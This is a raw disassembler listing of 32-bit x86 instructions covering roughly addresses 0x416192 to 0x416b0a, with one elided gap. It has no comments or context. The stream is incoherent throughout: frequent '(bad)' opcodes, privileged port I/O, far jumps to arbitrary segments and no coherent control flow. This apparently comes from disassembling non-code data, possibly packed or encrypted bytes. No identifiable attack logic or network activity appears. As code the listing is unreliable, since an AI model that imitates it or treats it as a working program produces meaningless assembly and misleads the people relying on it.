  416192:	les    ebp,FWORD PTR [edi-0x12]
  416195:	retf   0x177d
  416198:	mov    WORD PTR [ebx],cs
  41619a:	push   ebp
  41619b:	xchg   ebx,eax
  41619c:	dec    ebp
  41619d:	mov    cl,0x9b
  41619f:	fwait
  4161a0:	sti    
  4161a1:	and    ah,BYTE PTR [edi-0x75]
  4161a4:	aam    0xd4
  4161a6:	loopne 0x416171
  4161a8:	inc    ebx
  4161a9:	lahf   
  4161aa:	or     esi,DWORD PTR [ecx+0x0]
  4161ad:	cli    
  4161ae:	sbb    BYTE PTR [edx-0x152eb919],bl
  4161b4:	sub    edx,0x55
  4161b7:	pushf  
  4161b8:	mov    ah,0xfb
  4161ba:	pushf  
  4161bb:	(bad)  
  4161bc:	sub    BYTE PTR [esi+0xffc768],0x90
  4161c3:	mov    esp,0x2e7023ae
  4161c8:	ficomp DWORD PTR [eax]
  4161ca:	ins    BYTE PTR es:[edi],dx
  4161cb:	and    ch,BYTE PTR [edx]
  4161cd:	mov    edi,0x733c7e72
  4161d2:	imul   edi,DWORD PTR [esi],0xe8aa72d3
  4161d8:	push   ebx
  4161d9:	test   al,0x50
  4161db:	fistp  DWORD PTR [ecx]
  4161dd:	mov    ds:0x7997490f,eax
  4161e2:	stc    
  4161e3:	popf   
  4161e4:	add    cl,bl
  4161e6:	or     DWORD PTR [ecx-0x227118b4],edx
  4161ec:	in     eax,0x17
  4161ee:	cmp    eax,0xf9823cfe
  4161f3:	in     eax,0xb7
  4161f5:	push   edi
  4161f6:	data16 scas al,BYTE PTR es:[edi]
  4161f8:	in     eax,dx
  4161f9:	xor    edx,DWORD PTR [esp+ebp*4+0x76]
  4161fd:	add    edi,DWORD PTR [eax+0x7d075825]
  416203:	mov    gs,WORD PTR [edi]
  416205:	aas    
  416206:	mul    ebx
  416208:	leave  
  416209:	cli    
  41620a:	ret    
  41620b:	sbb    cl,BYTE PTR [esi-0x59b9fbbc]
  416211:	jge    0x41624a
  416213:	pop    es
  416214:	dec    ebx
  416215:	(bad)  
  416216:	sahf   
  416217:	gs je  0x41622c
  41621a:	sub    DWORD PTR [eax],edi
  41621c:	stc    
  41621d:	loopne 0x41624a
  41621f:	inc    edx
  416220:	pop    edi
  416221:	fisttp WORD PTR [eax+0x1b]
  416224:	lea    edx,[eax+edx*1+0x54]
  416228:	add    al,0xcd
  41622a:	push   edi
  41622b:	gs pop es
  41622d:	jg     0x416207
  41622f:	ins    DWORD PTR es:[edi],dx
  416230:	sub    dh,BYTE PTR [esp+eax*8+0x15acf10]
  416237:	cmp    BYTE PTR [ebx-0x63a80cd6],bh
  41623d:	pop    edx
  41623e:	rol    DWORD PTR [edx+0x47],0xeb
  416242:	repz and esp,ebp
  416245:	jmp    0xcdb8:0x4aecebe0
  41624c:	les    ecx,FWORD PTR [eax+0x1a]
  41624f:	cmp    ecx,DWORD PTR [ebx+0x53]
  416252:	mov    dl,0x9b
  416254:	mov    ds:0x59945ed6,eax
  416259:	in     al,dx
  41625a:	data16 cmp BYTE PTR [edx-0x50],0x96
  41625f:	int3   
  416260:	or     al,0x79
  416262:	mov    cs,edx
  416264:	fptan  
  416266:	cli    
  416267:	imul   esi,DWORD PTR [ebp+0x48bdc442],0x718a0e5
  416271:	aaa    
  416272:	fistp  DWORD PTR [ebx]
  416274:	lea    edx,[ebx-0x53]
  416277:	dec    ecx
  416278:	pushf  
  416279:	pop    edx
  41627a:	cmp    DWORD PTR [ebx-0x8],edi
  41627d:	push   edx
  41627e:	jmp    0x33ff:0x778c865a
  416285:	mov    bl,0xbd
  416287:	and    BYTE PTR [edx+ecx*4-0x67],0x1b
  41628c:	add    al,0x8c
  41628e:	xchg   ebp,eax
  41628f:	lahf   
  416290:	cmp    BYTE PTR [esp+edi*1-0x72],0x3a
  416295:	ss push ebp
  416297:	push   ds
  416298:	ins    DWORD PTR es:[edi],dx
  416299:	shr    cl,1
  41629b:	hlt    
  41629c:	leave  
  41629d:	enter  0x5c16,0x2f
  4162a1:	cdq    
  4162a2:	jns    0x41629e
  4162a4:	xchg   ecx,eax
  4162a5:	das    
  4162a6:	and    BYTE PTR [esi],cl
  4162a8:	and    BYTE PTR [bx+di],bh
  4162ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162ac:	push   0x3f5f2937
  4162b1:	pusha  
  4162b2:	mov    ebx,0xc8a2413f
  4162b7:	cld    
  4162b8:	inc    ecx
  4162b9:	stos   BYTE PTR es:[edi],al
  4162ba:	mov    edx,0x6cc501fb
  4162bf:	daa    
  4162c0:	loopne 0x41629e
  4162c2:	mov    al,0x2a
  4162c4:	push   esp
  4162c5:	lahf   
	...
  416496:	out    0xd2,al
  416498:	xchg   esp,eax
  416499:	icebp  
  41649a:	mov    ah,0xf7
  41649c:	out    0xd7,eax
  41649e:	aad    0x75
  4164a0:	(bad)  
  4164a1:	adc    edx,eax
  4164a3:	jbe    0x4164f3
  4164a5:	les    ecx,FWORD PTR [ebp+0x220001f0]
  4164ab:	pop    es
  4164ac:	add    BYTE PTR [eax],al
  4164ae:	fidivr WORD PTR [ecx-0x7c]
  4164b1:	mov    esi,0x207874ef
  4164b6:	mov    WORD PTR [esi+eax*4],ds
  4164b9:	in     al,dx
  4164ba:	in     eax,0x80
  4164bc:	adc    cl,bh
  4164be:	xor    ecx,esi
  4164c0:	xchg   ebx,eax
  4164c1:	aad    0x37
  4164c3:	mov    ebx,ss
  4164c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c6:	sar    esp,cl
  4164c8:	and    dl,BYTE PTR ds:0xbed822e
  4164ce:	jbe    0x41653c
  4164d0:	fdivr  DWORD PTR [edx+edi*1-0x9]
  4164d4:	mov    esi,0xdd0cf587
  4164d9:	inc    ecx
  4164da:	rol    DWORD PTR [di+0x4356],0xc
  4164e0:	stc    
  4164e1:	push   ds
  4164e2:	adc    cl,bh
  4164e4:	xchg   DWORD PTR [edx+ebp*4+0x21],edx
  4164e8:	ror    DWORD PTR [ebx],1
  4164ea:	stos   BYTE PTR es:[edi],al
  4164eb:	lahf   
  4164ec:	mov    esp,0xe13a1aa0
  4164f1:	xchg   esp,eax
  4164f2:	das    
  4164f3:	ins    BYTE PTR es:[edi],dx
  4164f4:	(bad)  
  4164f5:	sbb    eax,0x6c77d04c
  4164fa:	mov    eax,0x51e7a23c
  4164ff:	dec    esi
  416500:	mov    ds:0x9e287672,eax
  416505:	xchg   ecx,eax
  416506:	ret    0xe0eb
  416509:	jge    0x416573
  41650b:	retf   
  41650c:	push   0x32938bea
  416511:	leave  
  416512:	ins    DWORD PTR es:[edi],dx
  416513:	mov    edx,0x97ab3097
  416518:	repnz sub BYTE PTR [esi-0x372727c0],bh
  41651f:	leave  
  416520:	cmp    al,0xc7
  416522:	aad    0x27
  416524:	aaa    
  416525:	jg     0x416557
  416527:	pop    ds
  416528:	xor    ebx,DWORD PTR [ebx]
  41652a:	call   0x6a9d3a68
  41652f:	gs loop 0x416503
  416532:	imul   eax,DWORD PTR [esi+edi*8],0xb4d75807
  416539:	jo     0x4164bb
  41653b:	jae    0x416594
  41653d:	sbb    ecx,0x7199fbfc
  416543:	dec    esi
  416544:	xchg   edi,eax
  416545:	outs   dx,DWORD PTR ds:[esi]
  416546:	mov    dl,0xc3
  416548:	mov    ds:0x28551538,eax
  41654d:	mov    ds:0xf4eb3dcf,al
  416552:	lods   eax,DWORD PTR ds:[esi]
  416553:	outs   dx,BYTE PTR ds:[esi]
  416554:	inc    edx
  416555:	adc    esi,DWORD PTR [ecx+0x5202d3c4]
  41655b:	cmp    ebx,eax
  41655d:	call   0x9167:0x378a2d34
  416564:	pop    ecx
  416565:	jecxz  0x4164ef
  416567:	dec    esp
  416568:	inc    edx
  416569:	jae    0x416549
  41656b:	lock xor BYTE PTR [esi+eiz*4+0x64892d8b],0x66
  416574:	js     0x4165ba
  416576:	mov    cl,0x65
  416578:	int    0xf9
  41657a:	push   edi
  41657b:	xchg   ebp,eax
  41657c:	into   
  41657d:	jmp    0x2f36:0x7198e578
  416584:	mov    al,0x63
  416586:	enter  0x26f7,0xa1
  41658a:	loopne 0x4165b0
  41658c:	push   esi
  41658d:	jl     0x416559
  41658f:	jmp    0xca78798c
  416594:	into   
  416595:	imul   ebp,ecx,0xe1526b32
  41659b:	xchg   edi,eax
  41659c:	sub    BYTE PTR [esi],cl
  41659e:	mov    ds:0x425365ca,al
  4165a3:	test   ebx,eax
  4165a5:	lods   al,BYTE PTR ds:[esi]
  4165a6:	shr    BYTE PTR [edi-0x54],cl
  4165a9:	and    ebx,DWORD PTR [ebx]
  4165ab:	scas   eax,DWORD PTR es:[edi]
  4165ac:	call   0xebac53f9
  4165b1:	jne    0x4165f6
  4165b3:	fiadd  WORD PTR [edi-0x7]
  4165b6:	retf   0x44e4
  4165b9:	std    
  4165ba:	pop    ss
  4165bb:	fbld   TBYTE PTR [ebp-0x4a]
  4165be:	(bad)  
  4165bf:	out    dx,al
  4165c0:	imul   ebx,DWORD PTR [esi+edi*2+0xe],0x23
  4165c5:	scas   al,BYTE PTR es:[edi]
  4165c6:	jns    0x4165c9
  4165c8:	ss push ds
  4165ca:	stc    
  4165cb:	stos   BYTE PTR es:[edi],al
  4165cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165cd:	xchg   edi,eax
  4165ce:	les    ebp,FWORD PTR [eax-0x61]
  4165d1:	and    al,0x71
  4165d3:	sub    esi,ecx
  4165d5:	push   0x946f0581
  4165da:	fbstp  TBYTE PTR [esi]
  4165dc:	mov    edi,0x84d3c209
  4165e1:	sub    esi,esi
  4165e3:	push   ecx
  4165e4:	pop    esi
  4165e5:	cmp    BYTE PTR [ecx+0x2701aa49],dh
  4165eb:	mov    ah,0x95
  4165ed:	gs nop
  4165ef:	mov    esi,0x6bcdc03e
  4165f4:	push   esp
  4165f5:	idiv   BYTE PTR [ecx+0x49c771d2]
  4165fb:	das    
  4165fc:	push   ecx
  4165fd:	data16 test BYTE PTR [esi+esi*8],0x22
  416602:	dec    edi
  416603:	call   0x1292991b
  416608:	test   DWORD PTR ds:0x654fc691,0xd7a15b7f
  416612:	dec    ebx
  416613:	(bad)  
  416614:	gs dec esi
  416616:	push   es
  416617:	jbe    0x4165d6
  416619:	or     eax,0xd60116cc
  41661e:	pop    esp
  41661f:	out    0x2,al
  416621:	jmp    0x4bbd098c
  416626:	sub    eax,eax
  416628:	in     eax,0x24
  41662a:	pop    ebp
  41662b:	test   DWORD PTR [ebp-0x67894878],esi
  416631:	ins    BYTE PTR es:[edi],dx
  416632:	jmp    0x416693
  416634:	in     eax,0x30
  416636:	call   0xbe51e593
  41663b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41663c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41663d:	xor    eax,0xfe426729
  416642:	popa   
  416643:	push   edi
  416644:	and    ecx,edi
  416646:	inc    ecx
  416647:	(bad)  
  416648:	mov    bh,0x6a
  41664a:	scas   eax,DWORD PTR es:[edi]
  41664b:	or     edi,eax
  41664d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41664e:	xchg   esp,eax
  41664f:	sub    bh,BYTE PTR [ebp-0xb]
  416652:	adc    al,0x5a
  416654:	das    
  416655:	mov    bl,BYTE PTR [edx]
  416657:	je     0x4165de
  416659:	loop   0x4166d4
  41665b:	pop    ecx
  41665c:	cmc    
  41665d:	add    BYTE PTR [ebx-0x7e],ah
  416660:	sbb    esi,edi
  416662:	in     al,0xa2
  416664:	mov    ebx,esi
  416666:	jle    0x416626
  416668:	test   DWORD PTR [ecx+0x49],0xad2549e5
  41666f:	(bad)  
  416670:	adc    BYTE PTR [edi-0x24d2c834],bh
  416676:	sbb    al,0xe7
  416678:	mov    eax,0x65380455
  41667d:	mov    ecx,0xf0d80eb5
  416682:	jb     0x416636
  416684:	jmp    0xda49:0xaa9ed21b
  41668b:	in     al,0x41
  41668d:	cmp    BYTE PTR [edx+0x2b],al
  416690:	mov    eax,0x58ede521
  416695:	and    bl,bl
  416697:	outs   dx,BYTE PTR ds:[esi]
  416698:	mov    BYTE PTR [ecx],0x4a
  41669b:	mov    BYTE PTR [eax],ch
  41669d:	mov    edx,0x8a056d8f
  4166a2:	clc    
  4166a3:	rcr    BYTE PTR [ecx+0xdc2a8a],1
  4166a9:	in     al,0x7c
  4166ab:	fwait
  4166ac:	enter  0xee02,0x1e
  4166b0:	stc    
  4166b1:	jge    0x416676
  4166b3:	in     al,dx
  4166b4:	mov    al,ds:0xdd2194e8
  4166b9:	stos   BYTE PTR es:[edi],al
  4166ba:	mov    edx,0x43b3be42
  4166bf:	or     al,0x96
  4166c1:	xchg   BYTE PTR [edi+0x59],ch
  4166c4:	sub    eax,0x3a2600db
  4166c9:	jl     0x416710
  4166cb:	pop    ss
  4166cc:	outs   dx,BYTE PTR ds:[esi]
  4166cd:	mov    ds:0x565b0b35,eax
  4166d2:	and    DWORD PTR [eax],esi
  4166d4:	mov    dl,0x9c
  4166d6:	outs   dx,DWORD PTR ds:[esi]
  4166d7:	dec    eax
  4166d8:	sbb    eax,0xd13e408f
  4166dd:	ins    DWORD PTR es:[edi],dx
  4166de:	fstp   QWORD PTR [ecx-0x5a]
  4166e1:	push   ss
  4166e2:	inc    DWORD PTR [esi-0x2]
  4166e5:	pop    edx
  4166e6:	ret    0xc793
  4166e9:	sahf   
  4166ea:	ins    DWORD PTR es:[edi],dx
  4166eb:	cld    
  4166ec:	mov    ah,0xe4
  4166ee:	int3   
  4166ef:	ficom  DWORD PTR ds:0x81ed5f7a
  4166f5:	popa   
  4166f6:	and    BYTE PTR [eax+0x20],dh
  4166f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166fa:	rcl    esi,cl
  4166fc:	add    ecx,DWORD PTR [edi]
  4166fe:	xor    DWORD PTR [ebx],0xb4699504
  416704:	outs   dx,DWORD PTR ds:[esi]
  416705:	cwde   
  416706:	(bad)  
  416707:	out    0x55,eax
  416709:	and    edi,DWORD PTR [ebx-0x5d]
  41670c:	mov    al,ds:0x50d53123
  416711:	xor    eax,0x9929bd9e
  416716:	jg     0x4166da
  416718:	lods   eax,DWORD PTR ds:[esi]
  416719:	xchg   ecx,eax
  41671a:	adc    cl,BYTE PTR [ecx]
  41671c:	push   cs
  41671d:	jg     0x41676d
  41671f:	outs   dx,DWORD PTR ds:[esi]
  416720:	or     al,0x57
  416722:	in     eax,dx
  416723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416724:	in     eax,0xd9
  416726:	pushf  
  416727:	mov    ds:0x62b4b41c,eax
  41672c:	ror    BYTE PTR [edx-0x65e62c4c],1
  416732:	xchg   ebx,eax
  416733:	sub    al,0xdf
  416735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416736:	clc    
  416737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416738:	out    dx,al
  416739:	shl    BYTE PTR [edi-0x54],cl
  41673c:	jle    0x4166f8
  41673e:	push   cs
  41673f:	fisub  DWORD PTR [ebp-0x1cee086f]
  416745:	iret   
  416746:	jnp    0x416738
  416748:	sbb    edx,DWORD PTR cs:[edx-0x1b]
  41674c:	ins    BYTE PTR es:[edi],dx
  41674d:	jo     0x416743
  41674f:	cld    
  416750:	add    BYTE PTR [eax-0x5c8a93f8],bh
  416756:	pop    esp
  416757:	jbe    0x41679e
  416759:	xchg   BYTE PTR [edi+0x3a3826a1],bh
  41675f:	pop    ecx
  416760:	pop    eax
  416761:	jno    0x41674f
  416763:	or     al,0x6a
  416765:	retf   0x2070
  416768:	sbb    esp,ebp
  41676a:	push   ss
  41676b:	or     BYTE PTR [ebx-0x1f],ch
  41676e:	mov    al,ds:0x733e0914
  416773:	ds add al,0x7a
  416776:	cmp    eax,0x9838dbe2
  41677b:	retf   0x8f96
  41677e:	mov    al,ds:0x43c4ff1a
  416783:	mov    cl,BYTE PTR [ebx+0x36]
  416786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416787:	push   esi
  416788:	int    0x36
  41678a:	std    
  41678b:	sub    al,0xbc
  41678d:	push   edx
  41678e:	inc    eax
  41678f:	gs out dx,al
  416791:	xchg   edi,eax
  416792:	enter  0x229c,0x40
  416796:	mov    ecx,0x65d9a05
  41679b:	jge    0x41678b
  41679d:	pop    eax
  41679e:	push   cs
  41679f:	test   eax,edi
  4167a1:	and    eax,0x85b7325e
  4167a6:	dec    esp
  4167a7:	(bad)  
  4167a8:	or     eax,0xf0250bfb
  4167ad:	retf   0x801a
  4167b0:	ret    
  4167b1:	sub    eax,0xb435cab8
  4167b6:	call   0x5bbb3546
  4167bb:	pushf  
  4167bc:	leave  
  4167bd:	int3   
  4167be:	add    DWORD PTR [ebx+eax*8-0x1f81b2de],esi
  4167c5:	fs pushf 
  4167c7:	cwde   
  4167c8:	mov    al,ds:0x8650caa4
  4167cd:	adc    dl,dh
  4167cf:	cli    
  4167d0:	sub    ecx,DWORD PTR [ebx+0x36]
  4167d3:	add    al,bl
  4167d5:	das    
  4167d6:	sub    ebx,DWORD PTR [ecx-0x57]
  4167d9:	daa    
  4167da:	push   ds
  4167db:	add    edi,DWORD PTR [esi]
  4167dd:	add    BYTE PTR [ebx],dl
  4167df:	cmc    
  4167e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e1:	jo     0x41676c
  4167e3:	imul   edx,DWORD PTR [ecx+ebx*8-0x6da49ade],0xffffffa5
  4167eb:	or     DWORD PTR [edi+0x3],eax
  4167ee:	adc    BYTE PTR [eax+edi*4],dl
  4167f1:	push   edx
  4167f2:	push   cs
  4167f3:	adc    DWORD PTR [esi-0x47],esp
  4167f6:	inc    ebp
  4167f7:	iret   
  4167f8:	push   0x4eb8124b
  4167fd:	mov    ecx,0x469a4f68
  416802:	and    edx,ebx
  416804:	sbb    al,0xd7
  416806:	sbb    eax,0x640835cd
  41680b:	iret   
  41680c:	dec    edx
  41680d:	xor    al,0x7f
  41680f:	in     al,dx
  416810:	xchg   edi,eax
  416811:	xchg   ecx,eax
  416812:	ret    
  416813:	fstp   DWORD PTR [esi]
  416815:	jge    0x4167c9
  416817:	mov    esp,0xddd67df7
  41681c:	iret   
  41681d:	add    bl,ch
  41681f:	push   edi
  416820:	fstp   TBYTE PTR [ecx-0x54325fc2]
  416826:	imul   edi,ecx,0xffffffad
  416829:	mov    dl,0x6
  41682b:	jae    0x416854
  41682d:	or     BYTE PTR [eax-0x2c],al
  416830:	jno    0x4167dc
  416832:	dec    eax
  416833:	aas    
  416834:	push   0x43da000d
  416839:	xor    esp,DWORD PTR [ebp-0x279073da]
  41683f:	push   ds
  416840:	mov    dl,0xeb
  416842:	adc    DWORD PTR [ebp+eax*1-0x55],ebp
  416846:	jbe    0x41682d
  416848:	jae    0x416856
  41684a:	in     al,dx
  41684b:	repnz (bad) 
  41684d:	sub    eax,0x6bf4326b
  416852:	test   DWORD PTR [ebx+0x42],ecx
  416855:	retf   0x86cf
  416858:	lods   al,BYTE PTR ds:[esi]
  416859:	xor    DWORD PTR [ecx+0x10957524],esi
  41685f:	les    ecx,FWORD PTR [eax]
  416861:	add    eax,0x23e3557c
  416866:	fild   QWORD PTR [edi-0x708c956]
  41686c:	clc    
  41686d:	xor    bh,BYTE PTR [ebx-0x35bd2cbf]
  416873:	jl     0x416829
  416875:	pop    esi
  416876:	pop    ebx
  416877:	mov    eax,0xca138a16
  41687c:	pop    ds
  41687d:	ror    BYTE PTR ds:0x311d5729,0x6e
  416884:	sub    eax,0x4ff74a1a
  416889:	add    dl,0xa8
  41688c:	lea    ebp,[edx-0x34]
  41688f:	push   edi
  416890:	arpl   WORD PTR [ecx],bp
  416892:	outs   dx,DWORD PTR ds:[esi]
  416893:	sub    ebx,DWORD PTR [ebp+0x48]
  416896:	fs push edi
  416898:	repnz lods al,BYTE PTR ds:[esi]
  41689a:	xchg   DWORD PTR [edi],edx
  41689c:	fst    st(0)
  41689e:	bound  edx,QWORD PTR [ebp+0x1b]
  4168a1:	loop   0x4168b0
  4168a3:	mov    esp,0xf6d82bd4
  4168a8:	dec    esp
  4168a9:	sub    DWORD PTR [ebx-0x68],ebp
  4168ac:	push   ds
  4168ad:	mov    ch,0x7b
  4168af:	lds    edi,FWORD PTR [ebp+ebp*1+0x6f]
  4168b3:	push   edx
  4168b4:	in     al,dx
  4168b5:	pusha  
  4168b6:	aaa    
  4168b7:	or     eax,0x87f29ff2
  4168bc:	push   ebp
  4168bd:	add    eax,0xbd161e11
  4168c2:	xchg   edx,eax
  4168c3:	adc    DWORD PTR ds:0x351cafeb,ecx
  4168c9:	push   esi
  4168ca:	jno    0x4168a2
  4168cc:	inc    ebp
  4168cd:	mov    DWORD PTR [ecx+0x5e],edi
  4168d0:	in     al,0x97
  4168d2:	mov    esp,0xbd685cc6
  4168d7:	mov    bh,0xb0
  4168d9:	add    esp,DWORD PTR [ebx]
  4168db:	xrelease mov DWORD PTR [edx-0x47fe6f90],eax
  4168e2:	sub    al,0xf4
  4168e4:	(bad)  
  4168e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e6:	or     esp,DWORD PTR [edx-0x262f783f]
  4168ec:	sti    
  4168ed:	shl    BYTE PTR [edi],1
  4168ef:	loopne 0x4168c7
  4168f1:	fwait
  4168f2:	or     al,0x17
  4168f4:	and    al,0xe5
  4168f6:	pop    edi
  4168f7:	sbb    BYTE PTR [ebx],ah
  4168f9:	popf   
  4168fa:	cld    
  4168fb:	les    ebp,FWORD PTR [ecx]
  4168fd:	xor    al,0x21
  4168ff:	jno    0x4168f4
  416901:	jo     0x41692c
  416903:	mov    edx,0x7635e575
  416908:	sub    BYTE PTR [edx-0x3597771e],dl
  41690e:	hlt    
  41690f:	fs jge 0x416944
  416912:	repnz lods eax,DWORD PTR ds:[esi]
  416914:	pop    ecx
  416915:	fsubr  QWORD PTR [ebx-0x71]
  416918:	xchg   ecx,eax
  416919:	xchg   DWORD PTR ds:0x4b115a3e,ebx
  41691f:	cmp    eax,0x6204b7f8
  416924:	das    
  416925:	mov    al,ds:0x16aa4317
  41692a:	jle    0x4169a4
  41692c:	xchg   esi,eax
  41692d:	xor    BYTE PTR [ecx+0x47],bl
  416930:	js     0x4168eb
  416932:	add    eax,0x41cee4c6
  416937:	iret   
  416938:	push   ebx
  416939:	clc    
  41693a:	xchg   ebx,ecx
  41693c:	test   DWORD PTR [eax-0x29],0x637b865a
  416943:	mov    BYTE PTR [ebx],dl
  416945:	repz pop edi
  416947:	jmp    0x41693f
  416949:	pop    ecx
  41694a:	push   cs
  41694b:	popa   
  41694c:	fidiv  DWORD PTR [ebp+0x31]
  41694f:	mov    eax,ds:0x258a824f
  416954:	outs   dx,DWORD PTR ds:[esi]
  416955:	ins    DWORD PTR es:[edi],dx
  416956:	add    ebp,DWORD PTR [ecx-0x2c]
  416959:	test   DWORD PTR [ebp-0x38],ebx
  41695c:	and    DWORD PTR [ebx+0x63eb6f2a],edx
  416962:	pop    esi
  416963:	cld    
  416964:	ins    DWORD PTR es:[edi],dx
  416965:	jb     0x416978
  416967:	outs   dx,DWORD PTR ds:[esi]
  416968:	pushf  
  416969:	test   eax,0x23533638
  41696e:	sbb    BYTE PTR [eax],0x7f
  416971:	loop   0x4169e6
  416973:	mov    ds:0x9439a6b1,eax
  416978:	in     al,dx
  416979:	inc    eax
  41697a:	cwde   
  41697b:	adc    BYTE PTR [ebx],0x62
  41697e:	out    dx,al
  41697f:	sub    ebx,ecx
  416981:	cmp    eax,0x1b3e717b
  416986:	xchg   bh,dh
  416988:	lahf   
  416989:	adc    eax,0x71064238
  41698e:	xchg   ecx,eax
  41698f:	arpl   WORD PTR [eax+0x61],sp
  416992:	mov    ch,0xfe
  416994:	jl     0x416979
  416996:	cmp    BYTE PTR [ebp-0x57a5e18b],ah
  41699c:	sub    al,0x83
  41699e:	fcomp  QWORD PTR [esi+0x2c072898]
  4169a4:	push   ds
  4169a5:	pop    ds
  4169a6:	clc    
  4169a7:	mov    al,ds:0x9df056cb
  4169ac:	pop    ebp
  4169ad:	add    eax,eax
  4169af:	dec    ebx
  4169b1:	xlat   BYTE PTR ds:[ebx]
  4169b2:	out    0xb6,eax
  4169b4:	xchg   edi,eax
  4169b5:	test   al,0x84
  4169b7:	lods   al,BYTE PTR ds:[esi]
  4169b8:	sbb    ebp,DWORD PTR [ebx-0x50b9ebd]
  4169be:	shl    ebx,cl
  4169c0:	int3   
  4169c1:	arpl   WORD PTR [eax-0x65954914],bx
  4169c7:	(bad)  
  4169c8:	(bad)  
  4169c9:	loop   0x4169c4
  4169cb:	popf   
  4169cc:	pop    ebx
  4169cd:	mov    ah,0xdf
  4169cf:	call   0x85e92372
  4169d4:	test   al,bl
  4169d6:	fnstenv [eax]
  4169d8:	pop    ss
  4169d9:	cmc    
  4169da:	stos   DWORD PTR es:[edi],eax
  4169db:	xor    eax,0xa4c2ffcc
  4169e0:	mov    bl,0xd3
  4169e2:	xor    esp,DWORD PTR ds:0x2e41f4fb
  4169e8:	mov    eax,0xfd3c616c
  4169ed:	xchg   ecx,eax
  4169ee:	lock or BYTE PTR [ebx+0x72],ch
  4169f2:	xlat   BYTE PTR ds:[ebx]
  4169f3:	push   eax
  4169f4:	push   es
  4169f5:	xchg   edi,eax
  4169f6:	sahf   
  4169f7:	mov    dh,0x74
  4169f9:	push   eax
  4169fa:	xchg   ebx,eax
  4169fb:	sbb    cl,ah
  4169fd:	add    bh,BYTE PTR [ebx]
  4169ff:	retf   0x761a
  416a02:	adc    BYTE PTR [ebx],dl
  416a04:	popa   
  416a05:	(bad)  
  416a06:	pop    edi
  416a07:	ret    
  416a08:	in     eax,0xe7
  416a0a:	dec    ebp
  416a0b:	pop    ss
  416a0c:	dec    ecx
  416a0d:	imul   ebx,DWORD PTR [ebx+ebx*8],0x9e746368
  416a14:	neg    DWORD PTR [esp+eiz*8]
  416a17:	(bad)  
  416a18:	cmc    
  416a19:	and    BYTE PTR ss:[ecx+edx*1-0x79],ah
  416a1e:	mov    ah,BYTE PTR [edx+0x6d]
  416a21:	and    BYTE PTR [ebp+0x45435e4a],bh
  416a27:	and    bh,BYTE PTR ds:0xc9c21ba7
  416a2d:	cmc    
  416a2e:	nop
  416a2f:	push   esi
  416a30:	(bad)  
  416a32:	mov    esi,es
  416a34:	pop    ebp
  416a35:	outs   dx,BYTE PTR ds:[esi]
  416a36:	pop    es
  416a37:	test   DWORD PTR [eax+0x391f764a],esp
  416a3d:	sahf   
  416a3e:	dec    esi
  416a3f:	shr    BYTE PTR [ebx+0x50],0xa4
  416a43:	cmp    bl,BYTE PTR [ecx]
  416a45:	sub    BYTE PTR [ebx+edx*4],bl
  416a48:	loope  0x416a32
  416a4a:	nop
  416a4b:	mov    ecx,0x56ff5532
  416a50:	dec    ebp
  416a51:	inc    ebp
  416a52:	aam    0x4f
  416a54:	cwde   
  416a55:	clc    
  416a56:	fsubr  DWORD PTR [ecx+0x1e66abbc]
  416a5c:	add    DWORD PTR [ebx+0x27],0x21a613c7
  416a63:	mov    ah,0x1a
  416a65:	int    0x5d
  416a67:	mov    ch,dl
  416a69:	mov    ds:0x9bb10315,al
  416a6e:	and    dl,BYTE PTR [edx]
  416a70:	ret    
  416a71:	xor    DWORD PTR [edx],ebp
  416a73:	and    esi,DWORD PTR [eax+0x38ff42dd]
  416a79:	popa   
  416a7a:	repnz retf 
  416a7c:	cld    
  416a7d:	cmp    dh,BYTE PTR [edi+0x34]
  416a80:	dec    esi
  416a81:	lods   al,BYTE PTR ds:[esi]
  416a82:	push   DWORD PTR gs:[edi]
  416a85:	rcr    BYTE PTR [eax+edx*8],cl
  416a88:	add    ebx,esp
  416a8a:	jb     0x416a72
  416a8c:	pop    esi
  416a8d:	pop    esi
  416a8e:	dec    esi
  416a8f:	mov    al,0x79
  416a91:	xchg   BYTE PTR [ebx],bl
  416a93:	mov    esi,0x8ee3d5cd
  416a98:	mov    DWORD PTR [edi+0x10dc5891],edx
  416a9e:	loopne 0x416a63
  416aa0:	jmp    0xdad9:0x6832deac
  416aa7:	ror    cl,cl
  416aa9:	adc    BYTE PTR [edi],ch
  416aab:	repnz pop edi
  416aad:	ficomp DWORD PTR [ebp-0x51674d8a]
  416ab3:	call   0x6cbbb86f
  416ab8:	push   es
  416ab9:	sub    bl,BYTE PTR [esi]
  416abb:	aaa    
  416abc:	sar    BYTE PTR [edi+0x69],cl
  416abf:	loopne 0x416b1b
  416ac1:	sub    eax,DWORD PTR [eax]
  416ac3:	stc    
  416ac4:	fnstenv [ecx]
  416ac6:	jne    0x416a72
  416ac8:	pop    esi
  416ac9:	(bad)  
  416aca:	addr16 jo 0x416afa
  416acd:	dec    esi
  416ace:	add    DWORD PTR [ebx-0x6f],esi
  416ad1:	scas   eax,DWORD PTR es:[edi]
  416ad2:	push   esi
  416ad3:	std    
  416ad4:	fidiv  DWORD PTR [esi-0x1d]
  416ad7:	xor    al,0xa9
  416ad9:	inc    edx
  416ada:	aad    0xb3
  416adc:	push   esi
  416add:	lea    ebp,[esi+0x51d262fa]
  416ae3:	icebp  
  416ae4:	sbb    DWORD PTR [edx-0x17],edi
  416ae7:	jo     0x416b03
  416ae9:	sbb    bh,BYTE PTR [esi+ebx*1]
  416aec:	call   0xe340fb96
  416af1:	aaa    
  416af2:	cdq    
  416af3:	lds    esp,FWORD PTR [ebp-0x4a]
  416af6:	fnstcw WORD PTR [ecx-0x9]
  416af9:	xchg   BYTE PTR [eax+edx*8],dl
  416afc:	call   0x4cd287a2
  416b01:	pop    eax
  416b02:	es mov ah,0xef
  416b05:	inc    edi
  416b06:	xor    ch,dh
  416b08:	xor    ah,ah
  416b0a:	inc    ebx
